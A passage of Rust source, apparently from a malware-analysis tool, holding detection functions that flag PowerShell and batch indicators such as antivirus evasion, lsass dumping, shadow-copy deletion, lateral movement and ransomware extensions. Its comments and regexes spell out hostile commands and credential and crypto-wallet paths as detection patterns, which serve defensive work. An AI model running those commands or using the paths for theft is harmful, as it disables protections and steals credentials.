///   `Start-Process -Verb RunAs -FilePath X -ArgumentList Y`
///   `Start-Process X -Verb RunAs`
///   `Start-Process X -ArgumentList Y -Verb runas`
fn scan_self_elevation(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Anchor on `Start-Process` (or `saps` alias). Lazy match the body up
    // to `-Verb runas` so we capture the target+args regardless of order.
    static SELF_ELEV_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)\b(?:Start-Process|saps)\b([^\n;|&]{0,300}?)-Verb\s+["']?runas["']?([^\n;|&]{0,300})"#,
        )
        .expect("self-elev regex")
    });
    // rust regex doesn't support backreferences — match each quote style
    // explicitly. -FilePath accepts unquoted, single-, or double-quoted.
    static FILEPATH_DQ_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)-FilePath\s+"([^"]+)""#).expect("filepath-dq regex"));
    static FILEPATH_SQ_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)-FilePath\s+'([^']+)'"#).expect("filepath-sq regex"));
    static FILEPATH_BARE_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)-FilePath\s+([^\s'"]+)"#).expect("filepath-bare regex"));
    static ARGLIST_DQ_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?is)-ArgumentList\s+"(.+?)""#).expect("arglist-dq regex"));
    static ARGLIST_SQ_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?is)-ArgumentList\s+'(.+?)'"#).expect("arglist-sq regex"));
    for caps in SELF_ELEV_RE.captures_iter(deobfuscated) {
        let before = caps.get(1).map(|m| m.as_str()).unwrap_or("");
        let after = caps.get(2).map(|m| m.as_str()).unwrap_or("");
        let combined = format!("{before} {after}");
        // Prefer -FilePath X if present; otherwise the first positional
        // arg of the Start-Process call (the chunk before `-Verb`).
        let target = FILEPATH_DQ_RE
            .captures(&combined)
            .or_else(|| FILEPATH_SQ_RE.captures(&combined))
            .or_else(|| FILEPATH_BARE_RE.captures(&combined))
            .and_then(|c| c.get(1).map(|m| m.as_str().to_string()))
            .unwrap_or_else(|| {
                before
                    .trim()
                    .trim_start_matches(|c: char| c == '-' || c.is_whitespace())
                    .split_whitespace()
                    .next()
                    .unwrap_or("")
                    .trim_matches(|c: char| c == '"' || c == '\'')
                    .to_string()
            });
        if target.is_empty() {
            continue;
        }
        let args = ARGLIST_DQ_RE
            .captures(&combined)
            .or_else(|| ARGLIST_SQ_RE.captures(&combined))
            .and_then(|c| c.get(1).map(|m| m.as_str().to_string()));
        // Dedup
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::SelfElevation { target: tg, .. } if tg == &target
            )
        }) {
            continue;
        }
        env.traits
            .push(crate::traits::Trait::SelfElevation { target, args });
    }
}

/// Detect Defender / AV evasion. Common forms:
///   `Add-MpPreference -ExclusionPath '<path>'`
///   `Add-MpPreference -ExclusionExtension '<.exe>'`
///   `Add-MpPreference -ExclusionProcess '<X.exe>'`
///   `Set-MpPreference -DisableRealtimeMonitoring $true`
///   `Set-MpPreference -SubmitSamplesConsent 2`
///   `Set-MpPreference -MAPSReporting Disabled`
///   `sc stop WinDefend`  /  `sc config WinDefend start=disabled`
///   `netsh advfirewall set allprofiles state off`
fn scan_defender_evasion(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static EXCLUSION_PATH_DQ: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Add-MpPreference\s+-Exclusion(Path|Extension|Process)\s+"([^"]+)""#)
            .expect("excl-path-dq")
    });
    static EXCLUSION_PATH_SQ: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Add-MpPreference\s+-Exclusion(Path|Extension|Process)\s+'([^']+)'"#)
            .expect("excl-path-sq")
    });
    static EXCLUSION_PATH_BARE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Add-MpPreference\s+-Exclusion(Path|Extension|Process)\s+([^\s'";|&)]+)"#)
            .expect("excl-path-bare")
    });
    static DISABLE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Set-MpPreference\s+-(Disable[A-Za-z]+|MAPSReporting|SubmitSamplesConsent)\s+(\S+)"#)
            .expect("set-mp-disable")
    });
    static SC_DEFENDER_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)sc(?:\.exe)?\s+(stop|config|delete)\s+(WinDefend|MsMpSvc|wuauserv|MpsSvc|WdNisSvc)"#)
            .expect("sc-defender")
    });
    static FIREWALL_OFF_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)netsh\s+advfirewall\s+set\s+(\w+)\s+state\s+off"#).expect("fw-off")
    });
    // AMSI bypass markers — Invoke-NullAMSI, AmsiInitFailed/AmsiUtils
    // memory patches, ETW patch via System.Diagnostics.Eventing
    static AMSI_BYPASS_RE: Lazy<Regex> = Lazy::new(|| {
        // `AmsiScanBuffer` is the API being patched (most authoritative
        // marker — appears in the GetProcAddress lookup string).
        // `Amsi.dll`/`amsi.dll` referenced alongside VirtualProtect is
        // another strong signal we want to surface.
        Regex::new(r#"(?i)(?:Invoke-NullAMSI|amsiInitFailed|amsiUtils|amsiContext|amsiSession|AmsiScanBuffer|\bamsi\.dll\b)"#)
            .expect("amsi-bypass")
    });
    static ETW_PATCH_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)EtwEventWrite|System\.Diagnostics\.Eventing\.EventProvider"#)
            .expect("etw-patch")
    });
    let mut push = |kind: &str, target: String| {
        let target = target
            .trim_matches(|c: char| c == '\'' || c == '"')
            .to_string();
        let key = (kind.to_string(), target.clone());
        if env
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::DefenderEvasion { action: k, target: tg } if k == &key.0 && tg == &key.1))
        {
            return;
        }
        env.traits.push(crate::traits::Trait::DefenderEvasion {
            action: key.0,
            target,
        });
    };
    for caps in EXCLUSION_PATH_DQ
        .captures_iter(deobfuscated)
        .chain(EXCLUSION_PATH_SQ.captures_iter(deobfuscated))
        .chain(EXCLUSION_PATH_BARE.captures_iter(deobfuscated))
    {
        if caps
            .get(0)
            .is_some_and(|m| defender_evasion_match_in_assignment(deobfuscated, m.start()))
        {
            continue;
        }
        let Some(kind_suffix) = caps.get(1).and_then(|m| defender_evasion_label(m.as_str())) else {
            continue;
        };
        let kind = format!("exclusion-{kind_suffix}");
        let target = caps
            .get(2)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push(&kind, target);
    }
    push_mppreference_invoke_expression_exclusion_process(deobfuscated, &mut push);
    for caps in DISABLE_RE.captures_iter(deobfuscated) {
        let opt = caps.get(1).map(|m| m.as_str()).unwrap_or_default();
        let val = caps.get(2).map(|m| m.as_str()).unwrap_or_default();
        if defender_evasion_is_disabling_value(opt, val) {
            if let Some(suffix) = defender_evasion_action_suffix(opt) {
                push(&format!("setmp-{suffix}"), val.to_string());
            }
        }
    }
    for caps in SC_DEFENDER_RE.captures_iter(deobfuscated) {
        let Some(verb) = caps.get(1).and_then(|m| defender_evasion_label(m.as_str())) else {
            continue;
        };
        let svc = caps
            .get(2)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push(&format!("sc-{verb}"), svc);
    }
    for caps in FIREWALL_OFF_RE.captures_iter(deobfuscated) {
        let prof = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push("netsh-fw-off", prof);
    }
    if let Some(m) = AMSI_BYPASS_RE.find(deobfuscated) {
        push("amsi-bypass", m.as_str().to_string());
    }
    if ETW_PATCH_RE.is_match(deobfuscated) {
        push("etw-patch", String::new());
    }
}

fn defender_evasion_match_in_assignment(deobfuscated: &str, start: usize) -> bool {
    let prefix = &deobfuscated[..start];
    let segment_start = prefix
        .rfind(['\r', '\n', ';', '|', '&'])
        .map(|idx| idx + 1)
        .unwrap_or(0);
    let segment = prefix[segment_start..].trim_start();
    segment.starts_with('$') && segment.contains('=')
}

fn push_mppreference_invoke_expression_exclusion_process(
    deobfuscated: &str,
    push: &mut impl FnMut(&str, String),
) {
    let lower = deobfuscated.to_ascii_lowercase();
    if !lower.contains("invoke-expression")
        || !lower.contains("add-mppreference")
        || !lower.contains("-exclusionprocess")
    {
        return;
    }

    use once_cell::sync::Lazy;
    use regex::Regex;

    static PS_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*@\(([^)\r\n]{1,1024})\)"#)
            .expect("powershell array assignment regex")
    });
    static QUOTED_ITEM_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#""([^"\r\n]+)"|'([^'\r\n]+)'"#).expect("powershell quoted item regex")
    });

    for caps in PS_ARRAY_ASSIGN_RE.captures_iter(deobfuscated) {
        let Some(items) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        for item_caps in QUOTED_ITEM_RE.captures_iter(items) {
            let item = item_caps
                .get(1)
                .or_else(|| item_caps.get(2))
                .map(|m| m.as_str().trim())
                .unwrap_or_default();
            if item.is_empty() || item.contains(['$', '%']) {
                continue;
            }
            push("exclusion-process", item.to_string());
        }
    }
}

pub(crate) fn defender_evasion_is_disabling_value(opt: &str, val: &str) -> bool {
    // Only flag the disabling forms — `$true` / `1` / `Disabled` /
    // `2` (SubmitSamplesConsent=2 = never submit). Skip enabling
    // values like `$false` to avoid false positives in remediation
    // scripts that turn protections back on.
    let disabling_opt = opt.eq_ignore_ascii_case("disablerealtimemonitoring")
        || opt.eq_ignore_ascii_case("disablebehaviormonitoring")
        || opt.eq_ignore_ascii_case("disableioavprotection")
        || opt.eq_ignore_ascii_case("disableblockatfirstseen")
        || opt.eq_ignore_ascii_case("disableprivacymode")
        || opt.eq_ignore_ascii_case("disablescriptscanning");
    (disabling_opt
        && (val.eq_ignore_ascii_case("$true") || val == "1" || val.eq_ignore_ascii_case("true")))
        || (opt.eq_ignore_ascii_case("mapsreporting")
            && (val.eq_ignore_ascii_case("disabled") || val == "0"))
        || (opt.eq_ignore_ascii_case("submitsamplesconsent")
            && (val == "2" || val.eq_ignore_ascii_case("never")))
}

pub(crate) fn defender_evasion_action_suffix(opt: &str) -> Option<&'static str> {
    if opt.eq_ignore_ascii_case("disablerealtimemonitoring") {
        Some("disablerealtimemonitoring")
    } else if opt.eq_ignore_ascii_case("disablebehaviormonitoring") {
        Some("disablebehaviormonitoring")
    } else if opt.eq_ignore_ascii_case("disableioavprotection") {
        Some("disableioavprotection")
    } else if opt.eq_ignore_ascii_case("disableblockatfirstseen") {
        Some("disableblockatfirstseen")
    } else if opt.eq_ignore_ascii_case("disableprivacymode") {
        Some("disableprivacymode")
    } else if opt.eq_ignore_ascii_case("disablescriptscanning") {
        Some("disablescriptscanning")
    } else if opt.eq_ignore_ascii_case("mapsreporting") {
        Some("mapsreporting")
    } else if opt.eq_ignore_ascii_case("submitsamplesconsent") {
        Some("submitsamplesconsent")
    } else {
        None
    }
}

pub(crate) fn defender_evasion_label(label: &str) -> Option<&'static str> {
    if label.eq_ignore_ascii_case("path") {
        Some("path")
    } else if label.eq_ignore_ascii_case("extension") {
        Some("extension")
    } else if label.eq_ignore_ascii_case("process") {
        Some("process")
    } else if label.eq_ignore_ascii_case("stop") {
        Some("stop")
    } else if label.eq_ignore_ascii_case("config") {
        Some("config")
    } else if label.eq_ignore_ascii_case("delete") {
        Some("delete")
    } else {
        None
    }
}

/// Detect `[Reflection.Assembly]::Load($bytes)` and its overloads.
/// Emits one InMemoryAssemblyLoad trait per distinct variant. This is
/// the definitive .NET in-memory loader IOC — SOSTENER/banglabillboard
/// family + most modern .NET stagers use it (DonutLoader, Covenant,
/// SilentTrinity).
fn scan_inmem_assembly_load(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static REFLECT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)\[(?:system\.)?Reflection\.Assembly\]::(Load(?:File|From|WithPartialName|ReflectionOnly|Bytes)?)\s*\("#,
        )
        .expect("reflect load regex")
    });
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in REFLECT_RE.captures_iter(deobfuscated) {
        let variant = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        if variant.is_empty() || !seen.insert(variant.clone()) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::InMemoryAssemblyLoad { variant: v } if v == &variant
            )
        }) {
            continue;
        }
        env.traits
            .push(crate::traits::Trait::InMemoryAssemblyLoad { variant });
    }
}

/// Lateral movement / remote execution. Detects PsExec, WMIC /node,
/// WinRM/Invoke-Command -ComputerName, schtasks /S, sc \\host.
fn scan_lateral_movement(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static PSEXEC_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bpsexec(?:\.exe)?\s+\\\\([A-Za-z0-9.\-]+)"#).expect("psexec re")
    });
    static WMIC_NODE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bwmic[^\r\n]*?/node:(?:"([^"]+)"|(\S+))"#).expect("wmic /node re")
    });
    static INVOKE_CMD_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)\bInvoke-Command\b[^\r\n]*?-ComputerName\s+(?:"([^"]+)"|'([^']+)'|(\S+))"#,
        )
        .expect("invoke-cmd re")
    });
    static SCHTASKS_S_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bschtasks[^\r\n]*?\s/s\s+(?:"([^"]+)"|(\S+))"#).expect("schtasks /s re")
    });
    static SC_HOST_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bsc(?:\.exe)?\s+\\\\([A-Za-z0-9.\-]+)"#).expect("sc \\\\host re")
    });
    let mut push = |tool: &str, host: String| {
        let host = host
            .trim_matches(|c: char| c == '"' || c == '\'')
            .to_string();
        if host.is_empty() || host.eq_ignore_ascii_case("localhost") || host == "." {
            return;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::LateralMovement { tool: tl, target_host: h }
                    if tl == tool && h == &host
            )
        }) {
            return;
        }
        env.traits.push(crate::traits::Trait::LateralMovement {
            tool: tool.to_string(),
            target_host: host,
        });
    };
    for c in PSEXEC_RE.captures_iter(deobfuscated) {
        if let Some(m) = c.get(1) {
            push("psexec", m.as_str().to_string());
        }
    }
    for c in WMIC_NODE_RE.captures_iter(deobfuscated) {
        let host = c
            .get(1)
            .or_else(|| c.get(2))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push("wmic", host);
    }
    for c in INVOKE_CMD_RE.captures_iter(deobfuscated) {
        let host = c
            .get(1)
            .or_else(|| c.get(2))
            .or_else(|| c.get(3))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push("Invoke-Command", host);
    }
    for c in SCHTASKS_S_RE.captures_iter(deobfuscated) {
        let host = c
            .get(1)
            .or_else(|| c.get(2))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push("schtasks", host);
    }
    for c in SC_HOST_RE.captures_iter(deobfuscated) {
        if let Some(m) = c.get(1) {
            push("sc", m.as_str().to_string());
        }
    }
}

/// Anti-recovery: shadow copy delete, BCD recoveryenabled no, wbadmin
/// delete catalog. Ransomware staging IOCs.
fn scan_anti_recovery(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static PATTERNS: Lazy<Vec<(Regex, &str)>> = Lazy::new(|| {
        vec![
            (
                Regex::new(r"(?i)\bvssadmin(?:\.exe)?\s+delete\s+shadows").unwrap(),
                "vssadmin-delete-shadows",
            ),
            (
                Regex::new(r"(?i)\bwmic[^\r\n]*?shadowcopy\s+delete").unwrap(),
                "wmic-shadowcopy-delete",
            ),
            (
                Regex::new(r"(?i)\bbcdedit(?:\.exe)?[^\r\n]*?(?:/set\s+)?recoveryenabled\s+no")
                    .unwrap(),
                "bcdedit-recoveryenabled-no",
            ),
            (
                Regex::new(r"(?i)\bbcdedit(?:\.exe)?[^\r\n]*?bootstatuspolicy\s+ignoreallfailures")
                    .unwrap(),
                "bcdedit-bootstatus-ignoreallfailures",
            ),
            (
                Regex::new(
                    r"(?i)\bwbadmin(?:\.exe)?\s+delete\s+(?:catalog|backup|systemstatebackup)",
                )
                .unwrap(),
                "wbadmin-delete",
            ),
            (
                Regex::new(
                    r"(?i)\b(?:del|erase)\b[^\r\n]*(?:\*\.vhdx?|\*\.bac|\*\.bak|\*\.wbcat|\*\.bkf|\bbackup\*\.\*)",
                )
                .unwrap(),
                "backup-artifact-delete",
            ),
        ]
    });
    for (re, action) in PATTERNS.iter() {
        if !re.is_match(deobfuscated) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::AntiRecovery { action: a } if a == action
            )
        }) {
            continue;
        }
        env.traits.push(crate::traits::Trait::AntiRecovery {
            action: action.to_string(),
        });
    }
}

/// Network/IP discovery probes: nslookup, Resolve-DnsName, ping to
/// non-loopback IPs, calls to ipify/checkip/ip-api.
fn scan_network_probe(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static NSLOOKUP_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bnslookup(?:\.exe)?\s+([A-Za-z0-9.\-]+)"#).expect("nslookup re")
    });
    static RESOLVE_DNS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)\bResolve-DnsName\s+(?:-Name\s+)?(?:"([^"]+)"|'([^']+)'|([A-Za-z0-9.\-]+))"#,
        )
        .expect("resolve-dns re")
    });
    static IP_DISCOVERY_HOSTS: &[&str] = &[
        "api.ipify.org",
        "ipv4.icanhazip.com",
        "icanhazip.com",
        "checkip.dyndns.org",
        "checkip.amazonaws.com",
        "ifconfig.me",
        "ip-api.com",
        "ipinfo.io",
        "reallyfreegeoip.org",
    ];
    let mut push = |kind: &str, target: String| {
        if target.is_empty() {
            return;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::NetworkProbe { probe_kind: k, target: tg }
                    if k == kind && tg == &target
            )
        }) {
            return;
        }
        env.traits.push(crate::traits::Trait::NetworkProbe {
            probe_kind: kind.to_string(),
            target,
        });
    };
    for c in NSLOOKUP_RE.captures_iter(deobfuscated) {
        if let Some(m) = c.get(1) {
            push("dns-lookup", m.as_str().to_string());
        }
    }
    for c in RESOLVE_DNS_RE.captures_iter(deobfuscated) {
        let h = c
            .get(1)
            .or_else(|| c.get(2))
            .or_else(|| c.get(3))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push("dns-lookup", h);
    }
    for host in IP_DISCOVERY_HOSTS {
        if contains_ascii_case_insensitive(deobfuscated, host) {
            push("ip-discovery", (*host).to_string());
        }
    }
}

/// System enumeration / account discovery. `net user`, `net group`,
/// `net localgroup administrators`, `whoami /priv`, `Get-LocalUser`,
/// `Get-NetUser` (PowerView).
fn scan_enumeration(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static PATTERNS: Lazy<Vec<(Regex, &str)>> = Lazy::new(|| {
        vec![
            (
                Regex::new(r"(?im)^[^\r\n]*?\bnet(?:\.exe)?\s+(?:user|group|localgroup)\b[^\r\n]*")
                    .unwrap(),
                "net-user",
            ),
            (
                Regex::new(r"(?i)\bwhoami(?:\.exe)?\s+/(?:priv|groups|all)\b").unwrap(),
                "whoami-priv",
            ),
            (
                Regex::new(r"(?i)\b(?:query\s+session|quser)\b").unwrap(),
                "query-session",
            ),
            (
                Regex::new(r"(?i)\bGet-LocalUser\b").unwrap(),
                "get-localuser",
            ),
            (
                Regex::new(r"(?i)\bGet-NetUser\b|\bGet-NetGroup\b").unwrap(),
                "powerview-get",
            ),
            (
                Regex::new(r"(?i)\bsysteminfo(?:\.exe)?\b").unwrap(),
                "systeminfo",
            ),
            (
                Regex::new(r"(?i)\b(?:tasklist|wmic\s+process)\b").unwrap(),
                "tasklist",
            ),
        ]
    });
    for (re, kind) in PATTERNS.iter() {
        if let Some(m) = re.find(deobfuscated) {
            let cmd = snippet_prefix(m.as_str(), 120).trim().to_string();
            if env.traits.iter().any(|t| {
                matches!(
                    t, crate::traits::Trait::Enumeration { enum_kind: k, command: _ } if k == kind
                )
            }) {
                continue;
            }
            env.traits.push(crate::traits::Trait::Enumeration {
                enum_kind: kind.to_string(),
                command: cmd,
            });
        }
    }
}

/// Credential access — lsass dumping, Mimikatz invocations, browser
/// credential paths (Login Data SQLite, NSS key3.db, etc.), well-known
/// credential-theft tooling.
fn scan_credential_access(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static PATTERNS: Lazy<Vec<(Regex, &str, fn(&str) -> String)>> = Lazy::new(|| {
        vec![
            // lsass dump via comsvcs.dll / procdump / rundll32 minidumpwritedump
            (Regex::new(r#"(?i)\b(?:rundll32\s+\S*comsvcs\.dll[^\r\n]*?MiniDump|procdump(?:64)?(?:\.exe)?[^\r\n]*?lsass|sqldumper[^\r\n]*?lsass)"#).unwrap(),
             "lsass-dump", |m: &str| snippet_prefix(m, 120)),
            // Mimikatz invocations
            (Regex::new(r#"(?i)\b(?:Invoke-Mimikatz|mimikatz(?:\.exe)?\b|sekurlsa::|kerberos::|crypto::|lsadump::)"#).unwrap(),
             "mimikatz", |m| m.to_string()),
            // Browser credential paths
            (Regex::new(r#"(?i)\\Google\\Chrome\\User Data\\\S*Login Data|\\Mozilla\\Firefox\\Profiles\\\S*\\(?:key[34]\.db|logins\.json|cookies\.sqlite)|\\BraveSoftware\\\S*Login Data"#).unwrap(),
             "browser-cred-path", |m| snippet_prefix(m, 120)),
            (Regex::new(r#"(?i)\\(?:Google\\Chrome|Microsoft\\Edge|BraveSoftware|Opera Software|Vivaldi)\\[^\r\n"']*(?:Login Data|Cookies|Network\\Cookies)"#).unwrap(),
             "browser-cred-path", |m| m.to_string()),
            (Regex::new(r#"(?i)\\(?:Google\\Chrome|Microsoft\\Edge|BraveSoftware|Vivaldi)\\[^\r\n"']*\\Local Extension Settings\b"#).unwrap(),
             "browser-extension-store", trim_credential_path_prefix),
            (Regex::new(r#"(?i)\\Opera Software\\[^\r\n"']*\\Extensions\b"#).unwrap(),
             "browser-extension-store", trim_credential_path_prefix),
            (Regex::new(r#"(?i)\\discord(?:canary|ptb)?\\Local Storage\\leveldb\\[^\s"'\r\n]+"#).unwrap(),
             "discord-token-store", |m| m.to_string()),
            (Regex::new(r#"(?i)\\Steam\\(?:config\\loginusers\.vdf|ssfn[^\s"'\r\n\\]*)"#).unwrap(),
             "steam-credential-path", |m| m.to_string()),
            (Regex::new(r#"(?i)(?:^|[\\="'\s])AppData\\Roaming\\(?:Bitcoin|Zcash|Armory|bytecoin|com\.liberty\.jaxx|Exodus|Ethereum|Electrum|atomic|Guarda|Coinomi|WasabiWallet|Monero|Ripple|Dogecoin|Litecoin|DashCore|BitcoinABC|Vertcoin|Namecoin|DigiByte|Qtum|Firo|PPCoin|GridcoinResearch|Feathercoin|Raven|BitcoinGold|Komodo)(?:\\[^\s"'\r\n]*)?"#).unwrap(),
             "crypto-wallet-path", trim_credential_path_prefix),
            (Regex::new(r#"(?i)(?:^|[\\="'\s])AppData\\Roaming\\Telegram Desktop\\tdata(?:\\[^\s"'\r\n]*)?"#).unwrap(),
             "telegram-tdata", trim_credential_path_prefix),
            // Nirsoft tooling
            (Regex::new(r#"(?i)\b(?:nirsoft|webbrowserpassview|mailpassview|chromepass)\b"#).unwrap(),
             "nirsoft", |m| m.to_string()),
            // Wdigest credentials
            (Regex::new(r#"(?i)\b(?:UseLogonCredential|WDigest)\b"#).unwrap(),
             "wdigest-creds", |m| m.to_string()),
        ]
    });
    for (re, tech, fmt) in PATTERNS.iter() {
        if let Some(m) = re.find(deobfuscated) {
            let target = fmt(m.as_str());
            if env.traits.iter().any(|t| {
                matches!(
                    t, crate::traits::Trait::CredentialAccess { technique: tk, .. } if tk == tech
                )
            }) {
                continue;
            }
            env.traits.push(crate::traits::Trait::CredentialAccess {
                technique: tech.to_string(),
                target,
            });
        }
    }
}

fn trim_credential_path_prefix(path: &str) -> String {
    path.trim_start_matches(|c: char| {
        c == '=' || c == '"' || c == '\'' || c == '\\' || c.is_whitespace()
    })
    .to_string()
}

/// Process injection — Win32 API names invoked from PS via Add-Type
/// / P/Invoke, or via .NET Reflection. MITRE T1055.
fn scan_process_injection(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static API_RE: Lazy<Regex> = Lazy::new(|| {
        // `CreateThread` (no `Ex` suffix) is the local-process variant
        // meter.ps1 uses — same shellcode-execution intent. `VirtualProtect`
        // is the classic AMSI-bypass primitive (flip the AmsiScanBuffer
        // page to RWX before patching). Both are real ProcessInjection
        // signals in the corpus we sweep, so include them.
        // `GetProcAddress`/`GetModuleHandle`/`LoadLibrary` aren't injection
        // by themselves but the Cobalt-Strike / Meterpreter PowerShell
        // loader family (40010.ps1, index.ps1, sd4.ps1) ALWAYS resolves
        // them via reflection — and that resolution is the canonical
        // marker of an in-memory shellcode loader. Flag them as
        // ProcessInjection so the high-signal IOC surfaces.
        Regex::new(r#"(?i)\b(VirtualAllocEx|VirtualAlloc|VirtualProtect(?:Ex)?|WriteProcessMemory|CreateRemoteThread(?:Ex)?|CreateThread|NtMapViewOfSection|NtCreateThreadEx|QueueUserAPC|SetWindowsHookEx|RtlMoveMemory|ZwAllocateVirtualMemory|GetProcAddress|GetModuleHandle|LoadLibraryA?|UnsafeNativeMethods)\b"#)
            .expect("inject api re")
    });
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for m in API_RE.find_iter(deobfuscated) {
        let api = m.as_str().to_string();
        if !seen.insert(api.clone()) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::ProcessInjection { api: a } if a == &api
            )
        }) {
            continue;
        }
        env.traits
            .push(crate::traits::Trait::ProcessInjection { api });
    }
}

/// Input capture — keylogging, clipboard, screenshot. MITRE T1056.
fn scan_input_capture(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static PATTERNS: Lazy<Vec<(Regex, &str)>> = Lazy::new(|| {
        vec![
            (
                Regex::new(
                    r#"(?i)\b(?:GetAsyncKeyState|SetWindowsHookEx(?:A|W)?|GetKeyboardState)\b"#,
                )
                .unwrap(),
                "keylog",
            ),
            (
                Regex::new(
                    r#"(?i)\b(?:Get-Clipboard|Set-Clipboard|GetClipboardData|OpenClipboard)\b"#,
                )
                .unwrap(),
                "clipboard",
            ),
            (
                Regex::new(
                    r#"(?i)\b(?:CopyFromScreen|Graphics\.CopyFromScreen|PrintScreen|BitBlt)\b"#,
                )
                .unwrap(),
                "screenshot",
            ),
        ]
    });
    for (re, kind) in PATTERNS.iter() {
        if re.is_match(deobfuscated) {
            if env.traits.iter().any(|t| {
                matches!(
                    t, crate::traits::Trait::InputCapture { capture_kind: c } if c == kind
                )
            }) {
                continue;
            }
            env.traits.push(crate::traits::Trait::InputCapture {
                capture_kind: kind.to_string(),
            });
        }
    }
}

/// Ransomware file extension marker. Strong indicator when combined
/// with AntiRecovery (vssadmin delete shadows).
fn scan_ransom_ext(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static EXT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\.(?:locked|encrypted|locky|wcry|wannacry|ryuk|conti|lockbit|makop|dharma|cerber|cryptolocker|teslacrypt|crypt|enc|onion|payment)\b"#)
            .expect("ransom ext re")
    });
    let mut seen: u32 = 0;
    for m in EXT_RE.find_iter(deobfuscated) {
        let Some((idx, ext)) = canonical_ransom_extension(m.as_str()) else {
            continue;
        };
        let bit = 1u32 << idx;
        if seen & bit != 0 {
            continue;
        }
        seen |= bit;
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::RansomFileExtension { extension: e } if e == ext
            )
        }) {
            continue;
        }
        env.traits.push(crate::traits::Trait::RansomFileExtension {
            extension: ext.to_string(),
        });
    }
}

fn canonical_ransom_extension(ext: &str) -> Option<(usize, &'static str)> {
    const EXTENSIONS: &[&str] = &[
        ".locked",
        ".encrypted",
        ".locky",
        ".wcry",
        ".wannacry",
        ".ryuk",
        ".conti",
        ".lockbit",
        ".makop",
        ".dharma",
        ".cerber",
        ".cryptolocker",
        ".teslacrypt",
        ".crypt",
        ".enc",
        ".onion",
        ".payment",
    ];
    EXTENSIONS
        .iter()
        .copied()
        .enumerate()
        .find(|(_, candidate)| ext.eq_ignore_ascii_case(candidate))
}

/// WinRM / WMI remote execution.
fn scan_remote_exec(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static WINRM_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\b(?:winrm(?:\.cmd)?\s+(?:invoke|i)\s+|winrs\s+-r:?\s*(\S+)|Invoke-WmiMethod\b[^\r\n]*?-ComputerName\s+(\S+)|Set-WmiInstance\b[^\r\n]*?-ComputerName\s+(\S+))"#)
            .expect("winrm re")
    });
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in WINRM_RE.captures_iter(deobfuscated) {
        let host = caps
            .get(1)
            .or_else(|| caps.get(2))
            .or_else(|| caps.get(3))
            .map(|m| {
                m.as_str()
